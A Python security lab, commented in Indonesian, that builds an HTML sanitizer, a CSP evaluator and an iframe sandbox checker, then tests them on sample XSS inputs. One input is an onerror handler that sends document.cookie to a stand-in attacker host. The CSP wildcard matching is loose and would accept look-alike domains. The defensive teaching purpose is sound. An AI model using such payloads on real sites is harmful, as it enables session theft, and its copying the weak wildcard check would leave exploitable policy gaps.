#!/usr/bin/env python3
"""
Lab Hands-on: Keamanan HTML - Sanitasi DOM, Evaluator CSP, & Isolasi Sandbox
Kategori: 03-Frontend-and-Mobile | Bab: 09 | Modul: 02 Deep Dive

Skrip ini mengimplementasikan engine keamanan HTML berlapis:
1. Lexical DOM Sanitizer berbasis HTMLParser dengan mitigasi XSS berbasis allowlist.
2. Engine Evaluator Content Security Policy (CSP Level 3) berbasis nonce & host directive.
3. Validator Flag Sandbox <iframe> untuk mendeteksi eskalasi hak istimewa (privilege escalation).
"""

from html.parser import HTMLParser
import re
import urllib.parse
from dataclasses import dataclass, field
from typing import Dict, List, Set, Tuple

# Terminal ANSI Color Codes
CLR_RESET = "\033[0m"
CLR_BOLD = "\033[1m"
CLR_RED = "\033[91m"
CLR_GREEN = "\033[92m"
CLR_YELLOW = "\033[93m"
CLR_BLUE = "\033[94m"
CLR_CYAN = "\033[96m"


# ==============================================================================
# 1. DOM SANITIZER (Mitigasi Cross-Site Scripting / XSS)
# ==============================================================================
class DOMSanitizer(HTMLParser):
    """
    Parser streaming yang merekonstruksi dokumen HTML dengan menerapkan:
    - Tag allowlist.
    - Attribute allowlist per tag.
    - Validasi skema URI (mencegah payload javascript: dan data: malicious).
    - Eliminasi otomatis event handlers (on* attributes).
    """

    ALLOWED_TAGS: Set[str] = {
        "p", "b", "i", "u", "em", "strong", "a", "img", "code", "pre",
        "blockquote", "ul", "ol", "li", "span", "div", "h1", "h2", "h3"
    }

    ALLOWED_ATTRS: Dict[str, Set[str]] = {
        "a": {"href", "title", "target", "rel"},
        "img": {"src", "alt", "width", "height", "loading"},
        "*": {"class", "id", "lang", "dir"}  # Atribut global yang diizinkan
    }

    SAFE_SCHEMES: Set[str] = {"http", "https", "mailto"}

    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.output: List[str] = []
        self.stripped_elements: List[str] = []

    def _is_safe_uri(self, uri: str) -> bool:
        """Memverifikasi skema protokol URI untuk mencegah XSS berbasis eksekusi tautan."""
        parsed = urllib.parse.urlparse(uri.strip())
        if not parsed.scheme:
            # Relative URI diizinkan jika tidak diawali double slash (protocol-relative trick)
            return not uri.strip().startswith("//")
        return parsed.scheme.lower() in self.SAFE_SCHEMES

    def handle_starttag(self, tag: str, attrs: List[Tuple[str, str]]):
        tag_lower = tag.lower()
        if tag_lower not in self.ALLOWED_TAGS:
            self.stripped_elements.append(f"Tag <{tag_lower}>")
            return

        valid_attrs = self.ALLOWED_ATTRS.get(tag_lower, set()) | self.ALLOWED_ATTRS.get("*", set())
        clean_attrs: List[Tuple[str, str]] = []

        for attr, val in attrs:
            attr_lower = attr.lower()

            # Blokir seluruh handler event inline (onerror, onload, onclick, dll.)
            if attr_lower.startswith("on"):
                self.stripped_elements.append(f"Handler '{attr_lower}' pada <{tag_lower}>")
                continue

            if attr_lower in valid_attrs:
                # Validasi URI jika atribut menunjuk ke referensi target (href, src)
                if attr_lower in {"href", "src"}:
                    if not self._is_safe_uri(val):
                        self.stripped_elements.append(f"Payload URI berbahaya '{val}' pada {attr_lower}")
                        continue

                # Normalisasi atribut rel untuk anchor eksternal
                if tag_lower == "a" and attr_lower == "target" and val.lower() == "_blank":
                    clean_attrs.append(("rel", "noopener noreferrer"))

                clean_attrs.append((attr_lower, val))
            else:
                self.stripped_elements.append(f"Atribut terlarang '{attr_lower}' pada <{tag_lower}>")

        attrs_str = "".join(f' {k}="{urllib.parse.quote(v, safe=":/?#[]@!$&\'()*+,;=-")}"' for k, v in clean_attrs)
        self.output.append(f"<{tag_lower}{attrs_str}>")

    def handle_endtag(self, tag: str):
        tag_lower = tag.lower()
        if tag_lower in self.ALLOWED_TAGS:
            self.output.append(f"</{tag_lower}>")

    def handle_data(self, data: str):
        # Escaping entitas dasar pada node teks
        clean_data = (data.replace("&", "&amp;")
                          .replace("<", "&lt;")
                          .replace(">", "&gt;"))
        self.output.append(clean_data)

    def sanitize(self, raw_html: str) -> Tuple[str, List[str]]:
        self.reset()
        self.output = []
        self.stripped_elements = []
        self.feed(raw_html)
        self.close()
        return "".join(self.output), self.stripped_elements


# ==============================================================================
# 2. CSP (CONTENT SECURITY POLICY) ENGINE
# ==============================================================================
@dataclass
class CSPPolicy:
    """Parser dan Evaluator CSP Directives berbasis CSP Level 3."""
    directives: Dict[str, Set[str]] = field(default_factory=dict)

    @classmethod
    def parse_header(cls, header_value: str) -> "CSPPolicy":
        directives = {}
        for token in header_value.split(";"):
            token = token.strip()
            if not token:
                continue
            parts = token.split()
            directive_name = parts[0].lower()
            sources = set(p.strip() for p in parts[1:])
            directives[directive_name] = sources
        return cls(directives=directives)

    def evaluate(self, directive: str, target_src: str, nonce: str = "") -> Tuple[bool, str]:
        """
        Evaluasi apakah resource request / script execution diizinkan oleh directive.
        Menerapkan fallback ke 'default-src' jika directive spesifik tidak didefinisikan.
        """
        active_directive = directive
        sources = self.directives.get(directive)

        if sources is None:
            # Directives script-src, img-src, connect-src jatuh kembali ke default-src
            sources = self.directives.get("default-src", set())
            active_directive = "default-src (fallback)"

        if not sources:
            return False, f"Tidak ada policy fallback untuk directive '{directive}'"

        if "'none'" in sources:
            return False, f"Directive '{active_directive}' secara eksplisit menolak semua akses ('none')"

        # Pengecekan Nonce berbasis Cryptographic Tokens
        if nonce:
            expected_nonce = f"'nonce-{nonce}'"
            if expected_nonce in sources:
                return True, f"Nonce terverifikasi cocok pada '{active_directive}'"

        # Validasi inline scripts/styles
        if target_src == "'unsafe-inline'":
            if "'unsafe-inline'" in sources:
                return True, f"Unsafe inline script diizinkan oleh '{active_directive}'"
            return False, f"Inline execution diblokir oleh '{active_directive}' (Membutuhkan nonce/hash)"

        # Validasi skema host atau domain
        target_domain = urllib.parse.urlparse(target_src).netloc or target_src
        for src in sources:
            if src == "'self'":
                # Asumsikan origin aplikasi adalah 'app.internal'
                if target_domain in {"app.internal", ""}:
                    return True, "Resource berasal dari origin lokal ('self')"
            elif src.startswith("https://") or src.startswith("http://"):
                src_domain = urllib.parse.urlparse(src).netloc
                if target_domain == src_domain:
                    return True, f"Host cocok dengan whitelist: {src}"
            elif src.startswith("*."):
                wildcard = src[2:]
                if target_domain.endswith(wildcard):
                    return True, f"Domain cocok dengan wildcard policy: {src}"
            elif src == target_domain:
                return True, f"Domain tepat cocok: {src}"

        return False, f"Akses ke '{target_src}' ditolak oleh policy '{active_directive}'"


# ==============================================================================
# 3. IFRAME SANDBOX ISOLATION ANALYZER
# ==============================================================================
class SandboxAnalyzer:
    """
    Menganalisis konfigurasi sandbox atribut iframe untuk mendeteksi miskonfigurasi
    kritis yang memungkinkan breakout atau pengambilalihan sesi DOM.
    """

    DANGEROUS_COMBINATIONS = [
        (
            {"allow-scripts", "allow-same-origin"},
            "CRITICAL: Kombinasi 'allow-scripts' dan 'allow-same-origin' memungkinkan sandbox iframe "
            "menghapus atribut sandbox itu sendiri dan mengakses Cookie/LocalStorage origin induk."
        ),
        (
            {"allow-scripts", "allow-top-navigation"},
            "HIGH: Kombinasi ini memungkinkan iframe pihak ketiga mengarahkan (hijack) jendela utama."
        ),
        (
            {"allow-forms", "allow-modals"},
            "MEDIUM: Potensi Phishing, iframe dapat memicu alert native atau submit data palsu."
        )
    ]

    @staticmethod
    def inspect(sandbox_attr: str) -> List[Tuple[str, str]]:
        flags = set(filter(None, sandbox_attr.lower().split()))
        warnings = []

        if not flags:
            return [("SECURE", "Sandbox aktif penuh (Maximum isolation: script, form, & origin diblokir total)")]

        for req_flags, message in SandboxAnalyzer.DANGEROUS_COMBINATIONS:
            if req_flags.issubset(flags):
                severity = message.split(":")[0]
                warnings.append((severity, message))

        if not warnings:
            warnings.append(("OK", "Konfigurasi sandbox memiliki isolasi yang memadai."))

        return warnings


# ==============================================================================
# EXECUTION HARNESS & TESTS
# ==============================================================================
def print_section(title: str):
    print(f"\n{CLR_BOLD}{CLR_BLUE}=== {title} ==={CLR_RESET}")


def run_lab():
    print(f"{CLR_BOLD}{CLR_CYAN}LAB: Advanced HTML Security Deep Dive{CLR_RESET}")
    print(f"{CLR_CYAN}Engine: DOM Sanitization | CSP Level 3 | Sandbox Isolation{CLR_RESET}\n")

    # --- TAHAP 1: Pengujian DOM Sanitizer ---
    print_section("1. PENGUJIAN DOM SANITIZATION ENGINE")
    sanitizer = DOMSanitizer()

    dirty_payloads = [
        ("<p>Paragraf teks biasa dengan <b>bold</b> dan <i>italic</i>.</p>", "Clean Input"),
        ("<script>alert('XSS-Exploit-1')</script><p>Konten sah</p>", "Stored Script Injection"),
        ("<img src=\"https://cdn.example.com/pic.png\" onerror=\"fetch('http://attacker.com/steal?c='+document.cookie)\">", "Event Handler Injection"),
        ("<a href=\"javascript:evilFunction()\">Klik Disini</a>", "JavaScript Pseudo-Protocol"),
        ("<iframe src=\"http://malicious-site.com\"></iframe>", "Unauthorized Embed Element"),
        ("<a href=\"https://secure.com\" target=\"_blank\">External Link</a>", "Reverse Tabnabbing Attack Vector")
    ]

    for raw, label in dirty_payloads:
        clean, stripped = sanitizer.sanitize(raw)
        print(f"{CLR_BOLD}Uji Kasus:{CLR_RESET} {label}")
        print(f"  {CLR_YELLOW}Raw Payload   :{CLR_RESET} {raw}")
        print(f"  {CLR_GREEN}Sanitized HTML:{CLR_RESET} {clean}")
        if stripped:
            for s in stripped:
                print(f"  {CLR_RED}→ [DIBERSIHKAN]{CLR_RESET} {s}")
        print("-" * 60)

    # --- TAHAP 2: Evaluasi Content Security Policy (CSP) ---
    print_section("2. EVALUASI DIRECTIVE CONTENT SECURITY POLICY (CSP)")
    csp_header = (
        "default-src 'self'; "
        "script-src 'self' 'nonce-rAnd0m123' https://trustedscripts.com; "
        "img-src 'self' https://images.unsplash.com; "
        "object-src 'none';"
    )
    csp = CSPPolicy.parse_header(csp_header)
    print(f"{CLR_BOLD}Header Terpasang:{CLR_RESET}\n  {CLR_CYAN}{csp_header}{CLR_RESET}\n")

    eval_requests = [
        ("script-src", "app.internal", "", "Script lokal bawaan aplikasi"),
        ("script-src", "'unsafe-inline'", "", "Inline script tanpa atribut nonce"),
        ("script-src", "'unsafe-inline'", "rAnd0m123", "Inline script dengan nonce yang valid"),
        ("script-src", "'unsafe-inline'", "wR0ngN0nce", "Inline script dengan nonce manipulatif"),
        ("script-src", "https://trustedscripts.com/analytics.js", "", "Script dari CDN resmi"),
        ("script-src", "https://evil-cdn.hacker.com/payload.js", "", "Script dari Third-Party asing"),
        ("img-src", "https://images.unsplash.com/photo-1", "", "Aset visual dari host terdaftar"),
        ("img-src", "http://untrusted-host.org/tracker.gif", "", "Tracking pixel dari host tidak dikenal"),
        ("object-src", "app.internal/flash.swf", "", "Pemuatan objek plugins (flash/applet)")
    ]

    for directive, target, nonce, desc in eval_requests:
        allowed, reason = csp.evaluate(directive, target, nonce)
        status_clr = CLR_GREEN if allowed else CLR_RED
        status_sym = "[PERMITTED]" if allowed else "[BLOCKED]  "
        print(f"{status_clr}{status_sym}{CLR_RESET} {CLR_BOLD}{directive:<11}{CLR_RESET} Target: {target:<30} ({desc})")
        print(f"             ↳ Detil: {reason}")

    # --- TAHAP 3: Audit Isolasi Iframe Sandbox ---
    print_section("3. AUDIT PRIVILEGE ESKALASI SANDBOX IFRAME")
    sandbox_configs = [
        ("", "Sandbox Strict Maksimum (Atribut kosong)"),
        ("allow-scripts", "Eksekusi Script Diizinkan"),
        ("allow-scripts allow-same-origin", "Kombinasi Kritis Bypass Sandbox"),
        ("allow-scripts allow-top-navigation", "Kombinasi Frame Hijacking"),
        ("allow-forms allow-popups", "Interaksi Form Terbatas"),
    ]

    for flags, case_desc in sandbox_configs:
        print(f"\n{CLR_BOLD}Audit Atribut:{CLR_RESET} sandbox=\"{flags}\" ({case_desc})")
        results = SandboxAnalyzer.inspect(flags)
        for severity, msg in results:
            if severity in ("CRITICAL", "HIGH"):
                print(f"  {CLR_RED}✖ [{severity}]{CLR_RESET} {msg}")
            elif severity == "MEDIUM":
                print(f"  {CLR_YELLOW}⚠ [{severity}]{CLR_RESET} {msg}")
            else:
                print(f"  {CLR_GREEN}✔ [{severity}]{CLR_RESET} {msg}")

    print_section("KESIMPULAN AUDIT LAB")
    print(f"{CLR_GREEN}✔ Seluruh simulasi mitigasi (DOM Parser, Policy Evaluator, Sandbox Checker) berhasil dijalankan tanpa dependensi eksternal.{CLR_RESET}\n")


if __name__ == "__main__":
    run_lab()